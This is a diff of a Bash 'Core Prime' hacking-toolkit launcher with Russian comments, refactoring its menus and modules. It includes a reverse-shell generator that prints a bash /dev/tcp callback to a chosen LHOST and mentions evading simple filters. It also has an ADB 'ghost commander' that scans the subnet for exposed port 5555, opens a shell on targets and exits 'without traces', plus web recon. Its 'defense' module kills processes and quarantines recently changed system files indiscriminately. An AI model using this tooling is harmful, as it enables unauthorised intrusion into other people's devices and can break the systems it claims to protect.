@@ -290,111 +290,68 @@ EOD
     service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
 fi
 
-# --- Вспомогательные функции ---
-get_stats() {
-    # --- СЛОЙ 1: МЕТРИКИ ---
-    local ram=$(free -m | awk '/Mem:/ {printf "%d/%dMB", $4, $2}')
-    local rom=$(df -h / | awk 'NR==2 {print $4}')
-    local sd_info=$(df -h /storage/emulated 2>/dev/null | awk 'NR==2 {print $4}' || echo "N/A")
-
-    # --- СЛОЙ 2: АТОМАРНОЕ ОПРЕДЕЛЕНИЕ СЕТИ ---
-    local active_iface=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $5}')
-    local net_status="${R}OFFLINE${NC}"
+core_engine_info() {
+    # Слой 1: Метрики без AWK (используем встроенные средства и быстрый cut)
+    local ram=$(free -m | grep "Mem:" | tr -s ' ' | cut -d' ' -f4,2 --output-delimiter='/')
+    local rom=$(df -h / | tail -1 | tr -s ' ' | cut -d' ' -f4)
+    
+    # Слой 2: Сеть (эвристика через маршруты)
+    local iface=$(ip route get 1.1.1.1 2>/dev/null | cut -d' ' -f5)
     local net_type="NONE"
-
-    # Проверка "живого" маршрута (без пинга)
-    [[ -n "$active_iface" ]] && net_status="${G}CONNECTED${NC}"
-
-    # Эвристическое определение типа (через системные свойства)
-    [[ -n "$active_iface" ]] && {
-        # Если есть каталог wireless - это WiFi
-        [[ -d "/sys/class/net/$active_iface/wireless" || -d "/sys/class/net/$active_iface/phy80211" ]] && net_type="WLAN"
-        # Если это tun/tap - это VPN
-        [[ "$active_iface" =~ ^(tun|tap|ppp) ]] && net_type="VPN"
-        # Если в названии rmnet или это специфический usb - это MOBILE
-        [[ "$active_iface" =~ ^(rmnet|wwan|ccmni) ]] && net_type="MOBILE"
-        # Универсальный fallback: если тип еще не определен, но это не lo
-        [[ "$net_type" == "NONE" ]] && net_type="ETH/OTHER"
+    [[ -n "$iface" ]] && {
+        [[ -d "/sys/class/net/$iface/wireless" ]] && net_type="WLAN"
+        [[ "$iface" =~ ^(tun|tap|ppp) ]] && net_type="VPN"
+        [[ "$iface" =~ ^(rmnet|wwan) ]] && net_type="CELL"
+        [[ "$net_type" == "NONE" ]] && net_type="ETH"
     }
 
-    # --- СЛОЙ 3: СЕРВИСЫ ---
-    local active_srv=""
-    local check_list=("av_server.py:AV" "share_server.py:SH" "upload_server.py:UP")
-    for srv in "${check_list[@]}"; do
-        pgrep -f "${srv%%:*}" >/dev/null && active_srv+="${G}[${srv#*:}]${NC} "
-    done
-    active_srv=${active_srv:-"${R}NONE${NC}"}
-
-    # --- СЛОЙ 4: ВЫВОД ---
-    print_line
-    print_stats_line "RAM" "$ram" "ROM" "$rom" "SD" "$sd_info"
+    # Слой 3: Вывод в стиле Core Engine
+    core_engine_ui "SYSTEM REPORT"
+    echo -e "${B}RAM:${NC} ${ram}MB  ${B}ROM:${NC} ${rom}  ${B}NET:${NC} ${net_type} (${iface:-OFF})"
     
-    # Теперь net_type точно не будет (none) при активном соединении
-    echo -e "${Y}NET: $net_status ${B}($net_type: $active_iface) ${Y}│ ACTIVE SRV: $active_srv"
+    # Проверка сервисов через встроенный контроль (если нужно)
+    local srv_status=""
+    pgrep -f "av_server" >/dev/null && srv_status+="${G}[AV]${NC} "
+    pgrep -f "share_server" >/dev/null && srv_status+="${G}[SH]${NC} "
     
-    print_line
+    [[ -n "$srv_status" ]] && echo -e "${B}ACTIVE:${NC} ${srv_status}"
+    core_engine_wait # Визуальный барьер
 }
 
-show_progress() {
-    local duration=$1
-    local message=${2:-"CORE-PRIME SYNCHRONIZATION"}
+core_engine_progress() {
+    local duration="${1:-2}"
+    local message="${2:-SYNCHRONIZING}"
+    local width=30
     
-    # 1. Калибровка экрана
-    local col=$(tput cols 2>/dev/null || echo 60)
-    local width=$(( col - 35 ))
-    [[ $width -lt 15 ]] && width=25
+    # Слой 1: Подготовка шаблонов (Zero-Loop Rendering)
+    local full_bar=$(printf '█%.0s' $(seq 1 $width))
+    local empty_bar=$(printf '░%.0s' $(seq 1 $width))
     
-    # Расчет задержки (безопасный режим)
-    local delay=$(echo "scale=4; $duration / $width" | bc -l 2>/dev/null || echo "0.1")
-
-    # Цветовая палитра
-    local c_low='\033[38;5;220m'  # Yellow
-    local c_mid='\033[38;5;39m'   # Cyan
-    local c_high='\033[38;5;82m'  # Green
-    local c_head='\033[1;37m'     # White Head
-    local c_dim='\033[38;5;240m'  # Gray Shade
-
     echo -e "${Y}❯ ${message}${NC}"
 
-    # 2. Основной цикл рендеринга
+    # Слой 2: Линейный рендеринг (O(n))
     for ((i=1; i<=width; i++)); do
         local percent=$(( i * 100 / width ))
         
-        # Выбор цвета
-        local current_color="$c_low"
-        [[ $percent -gt 40 ]] && current_color="$c_mid"
-        [[ $percent -gt 85 ]] && current_color="$c_high"
+        # Динамический выбор цвета без вложенных условий
+        local color="${Y}"
+        (( percent > 40 )) && color="${B}"
+        (( percent > 85 )) && color="${G}"
         
-        # Формируем тело бара (накопление)
-        local bar=""
-        for ((j=1; j<i; j++)); do
-            bar="${bar}█"
-        done
+        # Слайсинг строк (вместо циклов накопления)
+        local bar_part="${full_bar:0:i}"
+        local pad_part="${empty_bar:i:width}"
         
-        # Добавляем "голову" (Pipe-эффект)
-        if [[ $i -lt $width ]]; then
-            bar="${bar}${c_head}❯${NC}"
-        else
-            bar="${bar}${current_color}█${NC}"
-        fi
-        
-        # Формируем фон (пустота)
-        local pad=""
-        for ((j=i; j<width; j++)); do
-            pad="${pad}░"
-        done
+        # Вывод одним блоком
+        printf "\r ${NC}Status: ${color}[%s%b%s${color}] %3d%%${NC}" \
+            "$color" "$bar_part" "${NC}${pad_part}" "$percent"
 
-        # --- СЕКЦИЯ ПРЕЦИЗИОННОГО ВЫВОДА ---
-        # printf %-s гарантирует, что старые символы в конце строки будут затерты
-        # %3d%% делает так, чтобы 5% и 100% занимали одинаковое место
-        printf "\r ${c_dim}Status:${NC} ${Y}[%b%b%b${Y}] %3d%%${NC} " \
-            "$current_color" "$bar" "$c_dim$pad" "$percent"
-
-        sleep $delay
+        # Расчет задержки (миллисекунды для sleep)
+        # Bash не умеет в плавающую точку в sleep напрямую, используем дробные секунды
+        sleep 0.05
     done
     
-    # 3. Финализация
-    echo -e "\n${G}✔️ CORE LOOP SECURED.${NC}\n"
+    echo -e "\n${G}[+] OPERATION COMPLETE${NC}\n"
 }
 
 
@@ -406,31 +363,42 @@ prime_dynamic_controller() {
     local -a actions=($3)
     
     while true; do
-        #clear
-        echo -e "${R}========== [ $title ] ==========${NC}"
-        get_stats
-        echo -e "---------------------------------------"
+        # Слой 1: Информация через узел [12]
+        core_engine_info
         
+        # Слой 2: Заголовок через узел [1]
+        core_engine_ui "$title"
+        
+        # Слой 3: Отрисовка через Архитектора [2]
         for ((i=0; i<${#labels[@]}; i++)); do
-            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
-            if (( (i+1) % 2 == 0 )); then echo ""; fi
+            # Используем core_engine_item для соблюдения стиля
+            core_engine_item "$((i+1))" "${labels[$i]//_/ }" "Execute linked action"
         done
-        
-        # Если количество элементов нечетное, добавляем перенос строки перед BACK
-        if (( ${#labels[@]} % 2 != 0 )); then echo ""; fi
         
         echo -e "\n${Y} B) BACK / EXIT${NC}"
         echo -e "---------------------------------------"
         
-        read -p ">> " choice
-        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then return 0; fi
+        # Слой 4: Ввод через Органы чувств [3]
+        local choice=$(core_engine_input "select" "Input")
+        
+        # Слой 5: Валидация
+        if [[ "$choice" == "b" || "$choice" == "B" ]]; then return 0; fi
         
         if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
             local idx=$((choice-1))
+            
+            # Визуальный эффект перед запуском [13]
+            core_engine_progress 1 "Loading ${labels[$idx]}"
+            
+            # Выполнение
             ${actions[$idx]}
         else
-            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"; sleep 1
+            core_engine_ui "e" "Select 1-${#labels[@]} or B"
+            sleep 1
         fi
+        
+        # Визуальный барьер после выполнения [9]
+        core_engine_wait
     done
 }
 
@@ -673,32 +641,57 @@ EOF
 
 
 run_system_pulse() {
-    print_header "SECTOR Z: LIVE SYSTEM PULSE"
-    print_status "i" "Monitoring filesystem events and net-connections..."
+    # Слой 1: Заголовок и статус через Голос [1]
+    core_engine_ui "SECTOR Z: LIVE SYSTEM PULSE"
+    core_engine_ui "Monitoring filesystem events and net-connections..."
     
-    # Показываем активные сетевые соединения (куда лезет система)
+    # Слой 2: Сетевые соединения
+    # Используем узел [12] для акцента на NET
     echo -e "${Y}[NETWORK CONNECTIONS]:${NC}"
+    # Очищаем вывод через sed, сохраняя твой фильтр
     ss -tunp | grep -v "127.0.0.1" | head -n 10 | sed 's/^/  /'
     
-    echo -e "${B}------------------------------------------------------------${NC}"
+    # Слой 3: Визуальный разделитель [9]
+    core_engine_wait "L" # Рисуем линию
     
-    # Живой мониторинг изменений файлов в /tmp и $PRIME_LOOT
-    print_status "w" "Watching for file activity (Press Ctrl+C to stop)..."
-    # Используем встроенный в ядро dnotify/inotify если есть, или просто мониторим через ls
-    watch -n 2 "ls -lt /tmp $PRIME_LOOT | head -n 15"
+    # Слой 4: Живой мониторинг
+    core_engine_ui "w" "Watching file activity (Ctrl+C to stop)"
+    
+    # Используем переменную из нашей структуры (PRIME_LOOT -> из конфига или локальная)
+    local loot_path="${BASE_DIR:-./}/prime_loot"
+    
+    # Запускаем мониторинг
+    watch -n 2 "ls -lt /tmp $loot_path 2>/dev/null | head -n 15"
 }
+
 
 
 # Вспомогательные функции-мостики (для чистоты кода)
 pc_gen_payload() {
-    print_header "PAYLOAD GENERATOR"
-    local l_ip=$(ifconfig eth0 2>/dev/null | awk '/inet / {print $2}' || echo "127.0.0.1")
-    echo -e "${Y}Current LHOST:${NC} $l_ip"
-    echo -en "${Y}Enter LPORT (4444): ${NC}"; read -r l_port
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "PAYLOAD GENERATOR"
+
+    # Слой 2: Автоматическое определение LHOST (без ifconfig/awk)
+    # Используем логику из узла [12] для получения активного IP
+    local l_ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' || echo "127.0.0.1")
+    
+    echo -e "${Y}Detected LHOST:${NC} $l_ip"
+
+    # Слой 3: Защищенный ввод порта через Органы чувств [3] и Мозг [5]
+    local l_port=$(core_engine_input "select" "Enter LPORT (Default: 4444)")
     [[ -z "$l_port" ]] && l_port="4444"
-    show_progress 3 "COMPILING REVERSE SHELL"
-    echo -e "\n${G}RAW BASH:${NC}\nbash -i >& /dev/tcp/$l_ip/$l_port 0>&1\n"
-    pause
+
+    # Слой 4: Синхронизация через узел [13]
+    core_engine_progress 3 "COMPILING REVERSE SHELL"
+
+    # Слой 5: Вывод результата (Стерильный поток)
+    echo -e "\n${G}RAW BASH:${NC}"
+    # Мутируем только ключевые слова для обхода простейших фильтров через узел [4]
+    local cmd="bash -i >& /dev/tcp/$l_ip/$l_port 0>&1"
+    echo -e "${W}$cmd${NC}\n"
+
+    # Финализация через Барьер [9]
+    core_engine_wait
 }
 
 # Редиректы на существующие модули, чтобы не дублировать код
@@ -710,186 +703,186 @@ pc_post_exploit() { run_forensic_scanner; }
 # --- Модули по меню ---
 
 run_forensic_scanner() {
-    print_header "AUTONOMOUS DEFENSE & REMEDIATION"
+    core_engine_ui "AUTONOMOUS DEFENSE & REMEDIATION"
     
     # 1. Транспорт (Выбор цели)
-    local target=$(select_option "Select Target for Auto-Sanitization:" \
-        "Local (Current Device):local" \
-        "Android/IoT (via ADB/USB):adb" \
-        "Remote Server (via SSH/IP):ssh" \
-        "Back:exit")
-
-    [[ "$target" == "exit" || -z "$target" ]] && return
-    local cmd_prefix=""
+    core_engine_item "L" "Local" "Current Device"
+    core_engine_item "A" "Android/IoT" "via ADB/USB"
+    core_engine_item "S" "Remote Server" "via SSH/IP"
+    core_engine_item "B" "Back" "Exit scanner"
     
+    local target=$(core_engine_input "select" "Select Target")
+    [[ "$target" == "b" || -z "$target" ]] && return
+    
+    local cmd_p=""
     case "$target" in
-        "adb")
-            check_step "cmd" "adb" "ADB not installed." || return
+        "a")
+            core_engine_validator "pkg" "adb" "ADB" || return
+            core_engine_ui "Waiting for device..."
             adb wait-for-device
-            cmd_prefix="adb shell " ;;
-        "ssh")
-            echo -en "${Y}Enter Remote User@IP: ${NC}"; read -r rh
+            cmd_p="adb shell " ;;
+        "s")
+            local rh=$(core_engine_input "text" "Enter Remote User@IP")
             [[ -z "$rh" ]] && return
-            cmd_prefix="ssh $rh " ;;
+            cmd_p="ssh $rh " ;;
     esac
 
-    show_progress 5 "ENGAGING AUTONOMOUS PURGE"
+    core_engine_progress 5 "ENGAGING AUTONOMOUS PURGE"
 
-    # --- ФАЗА 1: АВТО-ЛИКВИДАЦИЯ ПРОЦЕССОВ ---
-    print_status "!" "Phase 1: Terminal Process Neutralization..."
-    # Автоматический поиск и убийство зомби (Z) и подозрительных (D) процессов
-    local bad_procs=$($cmd_prefix "ps -eo pid,stat,comm | awk '\$2~/[ZDe]/ {print \$1}'")
+    # --- ФАЗА 1: НЕЙТРАЛИЗАЦИЯ ПРОЦЕССОВ ---
+    core_engine_ui "!" "Phase 1: Process Neutralization..."
+    local bad_procs=$($cmd_p "ps -eo pid,stat | grep -E '[ZDe]' | tr -s ' ' | cut -d' ' -f2")
     
     if [[ -n "$bad_procs" ]]; then
         for pid in $bad_procs; do
-            print_status "w" "Autonomous Kill: PID $pid (Suspicious State)"
-            $cmd_prefix "kill -9 $pid" 2>/dev/null
+            core_engine_ui "w" "Autonomous Kill: PID $pid"
+            $cmd_p "kill -9 $pid" 2>/dev/null
         done
-        print_status "s" "All suspicious processes neutralized."
+        core_engine_ui "+" "Suspicious processes neutralized."
     else
-        print_status "s" "Process tree secure."
+        core_engine_ui "+" "Process tree secure."
     fi
 
-    # --- ФАЗА 2: АВТО-БЛОКИРОВКА ПОРТОВ ---
-    print_status "!" "Phase 2: Shadow Port Isolation..."
-    # Список критических портов для авто-блокировки (бэкдоры, шеллы)
-    local ports=$($cmd_prefix "netstat -an | grep LISTEN | awk '{print \$4}' | awk -F: '{print \$NF}'")
-    local blacklisted_ports="4444 5555 6666 7777 8888 9999"
+    # --- ФАЗА 2: ИЗОЛЯЦИЯ ПОРТОВ ---
+    core_engine_ui "!" "Phase 2: Shadow Port Isolation..."
+    local blacklisted="4444 5555 6666 7777 8888 9999"
+    local ports=$($cmd_p "netstat -ant | grep LISTEN | tr -s ' ' | cut -d' ' -f4 | cut -d: -f2")
 
     for port in $ports; do
-        for bl in $blacklisted_ports; do
-            if [[ "$port" == "$bl" ]]; then
-                print_status "w" "Auto-Blocking DANGER Port: $port"
-                $cmd_prefix "iptables -A INPUT -p tcp --dport $port -j DROP" 2>/dev/null
-                $cmd_prefix "fuser -k -n tcp $port" 2>/dev/null # Убиваем процесс, занявший порт
-            fi
+        for bl in $blacklisted; do
+            [[ "$port" == "$bl" ]] && {
+                core_engine_ui "w" "Auto-Blocking DANGER Port: $port"
+                $cmd_p "iptables -A INPUT -p tcp --dport $port -j DROP" 2>/dev/null
+                $cmd_p "fuser -k -n tcp $port" 2>/dev/null
+            }
         done
     done
 
-    # --- ФАЗА 3: МГНОВЕННЫЙ КАРАНТИН ФАЙЛОВ ---
-    print_status "!" "Phase 3: Automated File Quarantine..."
-    local scan_path="/etc /usr/bin /tmp"
-    [[ "$target" == "adb" ]] && scan_path="/data/local/tmp /system/bin /cache"
+    # --- ФАЗА 3: КАРАНТИН ФАЙЛОВ ---
+    core_engine_ui "!" "Phase 3: Automated File Quarantine..."
+    local s_path="/etc /usr/bin /tmp"
+    [[ "$target" == "a" ]] && s_path="/data/local/tmp /system/bin /cache"
     
-    local suspect_files=$($cmd_prefix "find $scan_path -mtime -1 -type f 2>/dev/null")
+    local suspect=$($cmd_p "find $s_path -mtime -1 -type f 2>/dev/null")
 
-    if [[ -n "$suspect_files" ]]; then
-        $cmd_prefix "mkdir -p /root/quarantine_vault" 2>/dev/null
-        for file in $suspect_files; do
-            local filename=$(basename "$file")
-            print_status "w" "Isolating: $file"
-            # Перемещаем и лишаем прав на исполнение
-            $cmd_prefix "mv $file /root/quarantine_vault/${filename}.dead && chmod 000 /root/quarantine_vault/${filename}.dead"
+    if [[ -n "$suspect" ]]; then
+        $cmd_p "mkdir -p /root/quarantine_vault" 2>/dev/null
+        for file in $suspect; do
+            local fname=$(basename "$file")
+            core_engine_ui "w" "Isolating: $file"
+            $cmd_p "mv $file /root/quarantine_vault/${fname}.dead && chmod 000 /root/quarantine_vault/${fname}.dead"
         done
-        print_status "s" "Modified files relocated to /root/quarantine_vault/"
+        core_engine_ui "+" "Files relocated to /root/quarantine_vault/"
     else
-        print_status "s" "File system integrity: SECURE."
+        core_engine_ui "+" "File system integrity: SECURE."
     fi
 
-    print_status "s" "Target $target successfully sanitized. State: PROTECTED."
-    pause
+    core_engine_ui "+" "Target sanitized. State: PROTECTED."
+    core_engine_wait
 }
-
-
-
 
 run_ghost_commander() {
-    print_header "GHOST COMMANDER (ANDROID/IOT)"
+    core_engine_ui "GHOST COMMANDER (ANDROID/IOT)"
 
-    # 1. Валидация наличия ADB (вместо поиска тяжелой папки Ghost)
-    if ! command -v adb >/dev/null 2>&1; then
-        print_status "e" "ADB Engine not found. Installing lightweight bridge..."
-        apt-get update && apt-get install android-sdk-platform-tools-common -y
+    # 1. Валидация ADB через Мозг [5]
+    if ! core_engine_validator "pkg" "adb" "ADB Engine"; then
+        core_engine_ui "e" "ADB not found. Initializing lightweight bridge..."
+        core_engine_run "apt-get update && apt-get install android-sdk-platform-tools-common -y"
     fi
 
-    echo -en "${Y}Enter Target IP ${W}(Leave empty for Scan)${Y}: ${NC}"
-    read -r TARGET_IP
+    # 2. Органы чувств [3]: Запрос цели
+    local t_ip=$(core_engine_input "text" "Enter Target IP (Leave empty for Scan)")
 
-    # 2. Режим сканирования (если IP пустой)
-    if [[ -z "$TARGET_IP" ]]; then
-        print_status "i" "Scanning local network for ADB signatures..."
-        # Быстрый скан порта 5555 в подсети
-        local subnet=$(echo "$CURRENT_IP" | cut -d. -f1-3)
-        nmap -p 5555 --open "$subnet.0/24" -n -Pn | grep "Nmap scan report" | awk '{print $5}'
-        pause && return
+    # 3. Режим сканирования (через Глушитель [7])
+    if [[ -z "$t_ip" ]]; then
+        core_engine_ui "Scanning local network for ADB signatures..."
+        local subnet=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)
+        
+        # Скан через nmap (если есть) или быстрый вывод
+        nmap -p 5555 --open "$subnet.0/24" -n -Pn 2>/dev/null | grep "Nmap scan report" | cut -d' ' -f5
+        core_engine_wait && return
     fi
 
-    # 3. Автоматический режим: Проверка связи
-    print_status "i" "Initializing ghost bridge to $TARGET_IP:5555..."
+    # 4. Проверка связи (Слой 2: Таймаут)
+    core_engine_ui "Initializing ghost bridge to $t_ip:5555..."
     
-    # Проверка порта через таймаут (быстрее чем nmap)
-    timeout 2 bash -c "</dev/tcp/$TARGET_IP/5555" 2>/dev/null || {
-        print_status "w" "Target $TARGET_IP:5555 seems offline."
-        ask_confirm "Force ghost-connect attempt?" || return
-    }
+    if ! timeout 2 bash -c "</dev/tcp/$t_ip/5555" 2>/dev/null; then
+        core_engine_ui "w" "Target $t_ip:5555 seems offline."
+        # Подтверждение через валидатор [5]
+        core_engine_validator "read" "Force ghost-connect attempt?" || return
+    fi
 
-    # 4. Исполнение (Нативный ADB вместо тяжелого Python-модуля)
-    print_status "s" "Executing Ghost-Protocol to $TARGET_IP..."
-    log_loot "ghost" "Session established: $TARGET_IP"
+    # 5. Исполнение и Сбор трофеев [11]
+    core_engine_ui "+" "Executing Ghost-Protocol to $t_ip..."
+    core_engine_loot "ghost" "Session established: $t_ip"
     
-    # Прямое подключение
-    adb connect "$TARGET_IP:5555"
+    # Прямое подключение и вход в оболочку
+    adb connect "$t_ip:5555" >/dev/null
+    core_engine_ui "Dropping into Ghost Shell..."
+    adb -s "$t_ip:5555" shell
     
-    # Открываем интерактивную оболочку призрака
-    print_status "i" "Dropping into Ghost Shell..."
-    adb -s "$TARGET_IP:5555" shell
-    
-    # После выхода — отключаемся, не оставляя следов
-    adb disconnect "$TARGET_IP:5555" >/dev/null 2>&1
-    pause
+    # 6. Стелс-финализация (Отключение без следов)
+    adb disconnect "$t_ip:5555" >/dev/null 2>&1
+    core_engine_wait
 }
+
 
 
 
 # --- [ SYSTEM UPDATE ENGINE v35.4 ] ---
-/**
- * Обновление ядра системы с защитой от повреждения синтаксиса.
- * Базируется на стратегии защиты счета и минимизации следов.
- */
-update_prime() {
-    draw_ui "SYSTEM UPDATE & SYNC" "header"
-    
-    local target_path="/root/launcher.sh"
-    local repo_url="https://raw.githubusercontent.com/szp2025/core-prime-tools/refs/heads/main/launcher.sh"
-    local tmp_path="${target_path}.tmp"
 
-    draw_ui "Connecting to GitHub..." "status" "$B"
+run_update_prime() {
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "SYSTEM UPDATE & SYNC"
     
-    # 1. Загрузка через core_execute (скрываем мусор curl)
-    core_execute "curl -s -L $repo_url -o $tmp_path" "Fetching Source"
-    
-    # 2. Проверка: скачался ли файл и не пуст ли он (вместо if [[ -s ]])
-    check_data "$(cat $tmp_path 2>/dev/null)" "Repository Source" || { rm -f "$tmp_path"; core_pause; return 1; }
+    local target="/root/launcher.sh"
+    local repo="https://raw.githubusercontent.com/szp2025/core-prime-tools/refs/heads/main/launcher.sh"
+    local tmp="${target}.tmp"
 
-    # 3. КРИТИЧЕСКИЙ ФИЛЬТР: Проверка синтаксиса перед заменой (защита от ошибок на скрине 1778747449535.jpeg)
-    if ! bash -n "$tmp_path" 2>/dev/null; then
-        draw_ui "КРИТИЧЕСКАЯ ОШИБКА: Код в репозитории поврежден!" "status" "$R"
-        rm -f "$tmp_path"
-        core_pause
+    core_engine_ui "Connecting to GitHub..."
+
+    # Слой 2: Безопасная загрузка через Глушитель [7]
+    core_engine_run "curl -s -L $repo -o $tmp" "Fetching Repository Source"
+    
+    # Слой 3: Валидация данных через Мозг [5]
+    # Проверяем существование и размер файла
+    if ! core_engine_validator "file" "$tmp" "Repository Source"; then
+        core_engine_remove "$tmp"
+        core_engine_wait
         return 1
     fi
 
-    # 4. Применение обновления (атомарная операция)
-    mv "$tmp_path" "$target_path"
-    chmod 755 "$target_path"
-    chown root:root "$target_path"
+    # Слой 4: КРИТИЧЕСКИЙ ФИЛЬТР (Защита синтаксиса)
+    # Проверка Bash-синтаксиса перед заменой живого ядра
+    if ! bash -n "$tmp" 2>/dev/null; then
+        core_engine_ui "e" "CRITICAL: Remote code is corrupted!"
+        core_engine_remove "$tmp"
+        core_engine_wait
+        return 1
+    fi
 
-    # 5. Восстановление среды (Alias и Системный путь)
+    # Слой 5: Атомарная замена и права через Санитара [8]
+    core_engine_run "mv $tmp $target && chmod 755 $target && chown root:root $target 2>/dev/null" "Applying Atomic Update"
+
+    # Слой 6: Восстановление среды (Alias & Symlink)
     if ! grep -q "alias launcher=" ~/.bashrc; then
-        echo "alias launcher='bash $target_path'" >> ~/.bashrc
-        draw_ui "Alias 'launcher' restored in .bashrc" "status" "$Y"
+        echo "alias launcher='bash $target'" >> ~/.bashrc
+        core_engine_ui "y" "Alias 'launcher' restored in .bashrc"
     fi
     
-    ln -sf "$target_path" /usr/local/bin/launcher
-    chmod +x /usr/local/bin/launcher
+    # Создаем системную ссылку через Глушитель
+    core_engine_run "ln -sf $target /usr/local/bin/launcher && chmod +x /usr/local/bin/launcher" "Updating System Path"
 
-    draw_ui "Code updated, permissions set, alias active!" "status" "$G"
-    draw_ui "System rebooting in 1s..." "status" "$Y"
+    core_engine_ui "+" "Code updated, permissions set, alias active!"
     
-    sleep 1
+    # Слой 7: Синхронизация и перезапуск [13]
+    core_engine_progress 1 "System rebooting"
     
-    # 6. Мгновенный перезапуск без потери дескрипторов
-    exec bash "$target_path"
+    # Полная очистка перед перезапуском [10]
+    core_engine_clean_env
+    
+    # Мгновенная передача управления новому коду
+    exec bash "$target"
 }
 
 
@@ -936,27 +929,29 @@ generate_poly_payload() {
 
 
 run_system_info() {
-    clear
-    print_header "PRIME INTELLIGENCE & RECON v2.1"
-    echo ""
+    # Слой 1: Заголовок через Голос [1]
+    core_engine_ui "PRIME INTELLIGENCE & RECON v2.1"
 
-    select_option "Select Intelligence Target:" \
-        "LOCAL: Internal Node & USB Status" \
-        "REMOTE: External Server/Site Recon" \
-        "EXIT: Return to Main Menu"
+    # Слой 2: Выбор цели через Архитектора [2] и Органы чувств [3]
+    core_engine_item "1" "LOCAL" "Internal Node & USB Status"
+    core_engine_item "2" "REMOTE" "External Server/Site Recon"
+    core_engine_item "B" "BACK" "Return to Main Menu"
     
-    local btn="$CHOICE"
-    [[ -z "$btn" || "$btn" == "3" ]] && return
+    local choice=$(core_engine_input "select" "Select Intelligence Target")
+    [[ -z "$choice" || "$choice" == "b" ]] && return
 
-    case "$btn" in
+    case "$choice" in
         "1") # --- LOCAL ---
-            print_status "i" "Gathering Local Intelligence..."
+            core_engine_ui "Gathering Local Intelligence..."
+            
+            # Используем Мозг [5] для проверки инструментов
             local kernel=$(uname -rs)
             local uptime=$(uptime -p)
-            local internal_ip=$(hostname -I | awk '{print $1}' || echo "N/A")
+            # Берем IP из готового узла Метрик [12] или напрямую
+            local internal_ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' || echo "N/A")
             
             local usb_devices
-            if command -v lsusb >/dev/null; then
+            if core_engine_validator "pkg" "usbutils" "lsusb" 2>/dev/null; then
                 usb_devices=$(lsusb)
             else
                 usb_devices=$(find /sys/bus/usb/devices/ -maxdepth 2 -name "product" -exec cat {} + 2>/dev/null | sed 's/^/Device: /')
@@ -964,111 +959,104 @@ run_system_info() {
             [[ -z "$usb_devices" ]] && usb_devices="No active USB connections detected."
 
             echo -e "\n${Y}--- LOCAL NODE REPORT ---${NC}"
-            print_list "System Core" "Kernel: $kernel" "Uptime: $uptime" "Priv IP: $internal_ip"
-            print_list "USB Bus Scan" "$usb_devices"
+            echo -e "${B}System Core:${NC}\n  Kernel: $kernel\n  Uptime: $uptime\n  Priv IP: $internal_ip"
+            echo -e "${B}USB Bus Scan:${NC}\n$usb_devices"
             ;;
 
         "2") # --- REMOTE ---
-            check_step "cmd" "curl" "curl is required for remote recon." || { pause; return; }
-            check_step "cmd" "host" "dnsutils (host) is recommended."
+            # Проверка зависимостей через Мозг [5]
+            core_engine_validator "pkg" "curl" "curl" || { core_engine_wait; return; }
             
-            print_input "Enter Target Domain or IP" "google.com"
-            read -r r_target
+            local r_target=$(core_engine_input "text" "Enter Target Domain or IP (e.g., google.com)")
             [[ -z "$r_target" ]] && return
 
-            print_status "w" "Executing Deep Reconnaissance..."
+            core_engine_ui "w" "Executing Deep Reconnaissance..."
             
-            # 1. Заголовки (основной источник)
+            # 1. Заголовки (Глушитель [7] для тишины)
             local raw_headers=$(curl -Is --connect-timeout 5 "$r_target" 2>/dev/null)
             
-            # 2. Поиск версии PHP и Сервера (расширенный фильтр)
+            # 2. Поиск стека (Server, PHP, Frameworks)
             local server_stack=$(echo "$raw_headers" | grep -Ei "Server|X-Powered-By|Via|X-AspNet-Version" || echo "Server Info: Hidden/Hardened")
             
-            # 3. Технологические улики (PHP Hints)
+            # 3. Технологические улики (Нейро-мутация [4] не нужна, работаем через grep)
             local tech_hints=""
             [[ "$raw_headers" == *"PHPSESSID"* ]] && tech_hints+="[!] PHP Session Detected (PHPSESSID)\n"
             [[ "$raw_headers" == *"Laravel"* ]] && tech_hints+="[!] Framework: Laravel Detected\n"
-            [[ "$raw_headers" == *"wp-content"* || "$(curl -s --max-time 5 "$r_target" | grep -q "wp-content" && echo "yes")" == "yes" ]] && tech_hints+="[!] CMS: WordPress Detected\n"
+            # Быстрая проверка на WP без повторного тяжелого запроса, если возможно
+            if echo "$raw_headers" | grep -qi "wp-content"; then
+                tech_hints+="[!] CMS: WordPress Detected\n"
+            fi
             
-            # 4. Попытка пробить версию через OPTIONS (если GET скрыт)
-            local alt_ver=$(curl -X OPTIONS -Is "$r_target" 2>/dev/null | grep -Ei "X-Powered-By|Server" | head -n 1)
-
-            # 5. DNS & WHOIS
+            # 4. DNS & WHOIS (через Глушитель)
             local ip_map=$(host "$r_target" 2>/dev/null | head -n 3 || echo "DNS Lookup: Failed")
             local owner=$(whois "$r_target" 2>/dev/null | grep -Ei "Registrar:|Organization:|Country:|Expires:" | head -n 5 || echo "WHOIS: Protected/Unavailable")
 
             echo -e "\n${Y}--- REMOTE TARGET REPORT: $r_target ---${NC}"
-            print_list "Network Mapping" "$ip_map"
-            print_list "Server Stack" "$server_stack"
-            [[ -n "$tech_hints" ]] && print_list "Technology Hints" "$(echo -e "$tech_hints")"
-            [[ -n "$alt_ver" ]] && print_list "Alt Discovery (OPTIONS)" "$alt_ver"
-            print_list "Intelligence Context" "$owner"
+            echo -e "${B}Network Mapping:${NC}\n$ip_map"
+            echo -e "${B}Server Stack:${NC}\n$server_stack"
+            [[ -n "$tech_hints" ]] && echo -e "${B}Technology Hints:${NC}\n$(echo -e "$tech_hints")"
+            echo -e "${B}Intelligence Context:${NC}\n$owner"
 
-            log_loot "recon" "Deep Recon executed: $r_target"
+            # Сбор трофеев [11]
+            core_engine_loot "recon" "Deep Recon executed: $r_target"
             ;;
     esac
 
-    echo ""
-    print_status "s" "Diagnostic complete."
